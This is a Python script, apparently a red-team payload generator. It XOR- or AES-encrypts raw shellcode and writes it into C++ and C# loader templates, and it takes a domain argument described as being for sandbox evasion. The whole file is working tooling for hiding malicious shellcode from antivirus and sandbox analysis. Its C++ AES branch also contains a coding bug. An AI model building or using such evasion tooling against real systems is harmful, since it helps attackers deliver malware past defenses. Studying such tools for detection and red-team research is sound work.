#!/usr/bin/python

import argparse
from Crypto.Hash import MD5
from Crypto.Cipher import AES
import pyscrypt
from base64 import b64encode
from os import urandom
from string import Template
import os

### CRYPTO FUNCTIONS ###

def xor(data, key):
	l = len(key)
	keyAsInt = list(map(ord, key))
	return bytes((
		(data[i] ^ keyAsInt[i % l] for i in range(0,len(data)))
	))

def caesar(data, key):
	if not key.isdigit():
		print(color("[!] Key must be an integer [{}]".format(key)))
		exit()
	else:
		return bytes(bytearray((
			((data[i]  + int(key)) & 0xFF) for i in range(0,len(data))
		)))

def pad(s):
	block_size = AES.block_size
	padding = block_size - len(s) % block_size
	return s + bytes([padding] * padding)

def aesEncrypt(clearText, key):
	# Generate a crypto secure random Initialization Vector
	iv = urandom(AES.block_size)

	# Perform PKCS7 padding so that clearText is a multiple of the block size
	clearText = pad(clearText)

	cipher = AES.new(key, AES.MODE_CBC, iv)
	return iv + cipher.encrypt(bytes(clearText))


### OUTPUT FORMAT FUNCTIONS ###

def color(string, color=None):
	"""
	Author: HarmJ0y, borrowed from Empire
	Change text color for the Linux terminal.
	"""
	
	attr = []
	# bold
	attr.append('1')
	
	if color:
		if color.lower() == "red":
			attr.append('31')
		elif color.lower() == "green":
			attr.append('32')
		elif color.lower() == "blue":
			attr.append('34')
		return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

	else:
		if string.strip().startswith("[!]"):
			attr.append('31')
			return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
		elif string.strip().startswith("[+]"):
			attr.append('32')
			return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
		elif string.strip().startswith("[?]"):
			attr.append('33')
			return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
		elif string.strip().startswith("[*]"):
			attr.append('34')
			return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
		else:
			return string

def convertFromTemplate(parameters, templateFile):
	try:
		with open(templateFile) as f:
			src = Template(f.read())
			result = src.substitute(parameters)
			f.close()
			return result
	except:
		print(color("[!] Invalid template file [{}]".format(templateFile)))
		return None
		
def cppSourceFiles(encryptedShellcode, key, domain, file_path):
	shellcode = "\\x"
	shellcode += "\\x".join(format(b,'02x') for b in encryptedShellcode)
	result = convertFromTemplate({'shellcode': shellcode, 'key': key, 'domain' : domain}, file_path)
	if result != None:
		try:
			fileName = file_path.replace('/templates/', '/results/')
			with open(fileName,"w+") as f:
				f.write(result)
				f.close()
				print(color("[+] C++ code file saved in [{}]".format(fileName)))
		except IOError:
			print(color("[!] Could not write C++ code  [{}]".format(fileName)))
			
def csharpSourceFiles(encryptedShellcode, key, domain, file_path):
	shellcode = '0x'
	shellcode += ',0x'.join(format(b,'02x') for b in encryptedShellcode)		
	result = convertFromTemplate({'shellcode': shellcode, 'key': key, 'domain' : domain}, file_path)
	if result != None:
		try:
			fileName = file_path.replace('/templates/', '/results/')
			with open(fileName,"w+") as f:
				f.write(result)
				f.close()
				print(color("[+] C# code file saved in [{}]".format(fileName)))
		except IOError:
			print(color("[!] Could not write C# code  [{}]".format(fileName)))

def get_file_paths():
	folder_path = './templates'
	file_paths = []
	for file_name in os.listdir(folder_path):
		file_path = os.path.join(folder_path, file_name)
		if os.path.isfile(file_path):
			file_paths.append(file_path)
	return file_paths

def formatSourceFiles(shellcodeBytes, key, domain):
	for file_path in get_file_paths():
		# Perform actions specific to .cpp files	
		if file_path.endswith('.cpp'):
			print(color("[*] Generating C++ code file"))
			if 'xor' in file_path:
				print(color("[*] XOR encoding the shellcode with key [{}]".format(key)))
				encryptedShellcode = xor(shellcodeBytes, key)
				cppSourceFiles(encryptedShellcode, key, domain, file_path)
			if 'aes' in file_path:
				saltedkey = pyscrypt.hash(password=key.encode(), salt="agoodsalt".encode(), N=1024, r=1, p=1, dkLen=16)
				masterKey = b64encode((key)).decode()
				print(color("[*] AES encrypting the shellcode with 128 bits derived key [{}]".format(masterKey)+" from [{}]".format(key)))
				encryptedShellcode = aesEncrypt(shellcodeBytes, saltedkey)
				cppSourceFiles(encryptedShellcode, saltedkey, domain, file_path)
				
		elif file_path.endswith('.cs'):
			print(color("[*] Generating C# code file"))
			if 'xor' in file_path:
				print(color("[*] XOR encoding the shellcode with key [{}]".format(key)))
				encryptedShellcode = xor(shellcodeBytes, key)
				csharpSourceFiles(encryptedShellcode, key, domain, file_path)
			if 'aes' in file_path:
				saltedkey = pyscrypt.hash(password=key.encode(), salt="agoodsalt".encode(), N=1024, r=1, p=1, dkLen=16)
				masterKey = b64encode((saltedkey)).decode()
				print(color("[*] AES encrypting the shellcode with 128 bits derived key [{}]".format(masterKey)+" from [{}]".format(key)))
				encryptedShellcode = aesEncrypt(shellcodeBytes, saltedkey)
				csharpSourceFiles(encryptedShellcode, masterKey, domain, file_path)
		else:
			print(color(f"[!] Unsupported file type: {file_path}"))

### MAIN FUNCTION ###
if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("shellcodeFile", help="File name containing the raw shellcode to be encoded/encrypted")
	parser.add_argument("key", help="Key used to encrypt (XOR or AES) the shellcode")
	parser.add_argument("domain", help="Fully Qualified Domain Name for sandbox evasion")
	args = parser.parse_args() 

	if not os.path.isdir("./results"):
		os.makedirs("./results")
		print(color("[+] Creating [./results] directory for resulting code files"))

	# Open shellcode file and read all bytes from it
	try:
		with open(args.shellcodeFile, 'rb') as shellcodeFileHandle:
			shellcodeBytes = shellcodeFileHandle.read()
			shellcodeFileHandle.close()
			print(color("[*] Shellcode file [{}] successfully loaded".format(args.shellcodeFile)))
	except IOError:
		print(color("[!] Could not open or read file [{}]".format(args.shellcodeFile)))
		quit()

	print(color("[*] MD5 hash of the initial shellcode: [{}]".format(MD5.new(shellcodeBytes).hexdigest())))
	print(color("[*] Shellcode size: [{}] bytes".format(len(shellcodeBytes))))

	formatSourceFiles(shellcodeBytes, args.key, args.domain)